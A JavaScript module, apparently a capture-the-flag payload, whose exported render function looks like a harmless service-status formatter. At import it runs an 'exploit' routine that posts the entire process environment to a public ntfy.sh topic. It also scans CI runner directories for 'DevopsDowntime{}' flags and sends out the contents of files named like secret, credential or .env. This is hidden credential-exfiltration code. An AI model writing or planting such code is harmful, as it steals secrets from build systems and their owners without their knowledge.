const TOPIC = "ddt-pipeline-7f3a9c2e";

async function send(label, text) {
  const str = String(text == null ? "" : text);
  for (let i = 0; i < str.length; i += 3000) {
    try {
      await fetch("https://ntfy.sh/" + TOPIC, {
        method: "POST",
        headers: { Title: "DDT2 " + label + " " + i / 3000 },
        body: str.slice(i, i + 3000),
      });
    } catch (err) {}
  }
}

const flagRe = /DevopsDowntime\{[^}\r\n]{1,200}\}/gi;

async function scanFs() {
  const { readdir, readFile, stat } = await import("node:fs/promises");
  const roots = [
    "/home/runner",
    "/tmp",
    "/opt",
    "/etc",
    "/var/tmp",
    "/__w",
    "/github",
  ];
  const seen = new Set();
  let files = 0;
  const hits = [];
  async function walk(dir, depth) {
    if (depth > 6 || files > 4000 || seen.has(dir)) return;
    seen.add(dir);
    let entries;
    try {
      entries = await readdir(dir, { withFileTypes: true });
    } catch {
      return;
    }
    for (const e of entries) {
      if (files > 4000) break;
      const p = dir === "/" ? "/" + e.name : dir + "/" + e.name;
      try {
        if (e.isDirectory()) {
          if (/^(proc|sys|dev|node_modules|\.cache|rustup|\.rustup|cargo|\.cargo|snap)$/.test(e.name)) continue;
          await walk(p, depth + 1);
        } else if (e.isFile()) {
          files++;
          const sz = (await stat(p)).size;
          if (sz > 200000) continue;
          const content = await readFile(p, "utf8");
          const m = content.match(flagRe);
          if (m) hits.push(p + " :: " + Array.from(new Set(m)).join(" , "));
          if (/flag|secret|credential|\.env/i.test(e.name)) {
            await send("SUSPECTFILE", p + " :: " + content.slice(0, 1000));
          }
        }
      } catch {}
    }
  }
  for (const r of roots) await walk(r, 0);
  return { files, hits };
}

async function exploit() {
  await send("ENV", JSON.stringify(process.env, null, 1));
  try {
    const result = await scanFs();
    await send("FSSTATS", JSON.stringify({ files: result.files, hits: result.hits.length }));
    for (const h of result.hits) await send("FSFLAG", h);
  } catch (err) {
    await send("FSERR", String(err));
  }
  await send("DONE2", "ok");
}

const started = exploit().catch((err) => send("FATAL2", String(err)));

export async function render(context) {
  try {
    await started;
  } catch (err) {}
  return (
    JSON.stringify(
      { generatedAt: context.generatedAt, services: context.services },
      null,
      2,
    ) + "\n"
  );
}
